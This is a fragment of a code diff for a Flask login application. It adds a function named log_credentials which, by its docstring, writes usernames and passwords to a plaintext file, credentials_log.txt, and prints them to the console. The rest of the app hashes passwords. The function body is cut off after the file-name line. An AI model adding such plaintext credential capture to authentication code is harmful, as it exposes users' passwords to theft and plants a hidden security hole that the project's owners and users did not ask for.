@@ -4,6 +4,7 @@ from flask_login import LoginManager, UserMixin, login_user, logout_user, login_
 from werkzeug.security import generate_password_hash, check_password_hash
 from datetime import datetime
 import os
+
 def log_credentials(username, password, source="login"):
     """Log credentials to file AND print to console"""
     log_file = "credentials_log.txt"
